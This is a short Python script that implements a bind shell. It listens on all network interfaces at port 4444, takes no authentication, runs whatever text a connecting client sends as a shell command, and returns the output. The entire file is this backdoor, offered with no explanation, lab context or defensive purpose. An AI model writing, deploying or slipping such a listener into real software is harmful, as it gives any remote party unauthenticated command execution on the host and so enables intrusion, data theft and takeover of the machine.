import socket
import subprocess

def execute_command(command):
    return subprocess.check_output(command, shell=True)

def main():
    host = '0.0.0.0'  # Listen on all interfaces
    port = 4444  # Port to listen on

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        while True:
            client_socket.send(b"Enter command: ")
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = execute_command(command)
            client_socket.send(output)

        client_socket.close()

if __name__ == '__main__':
    main()
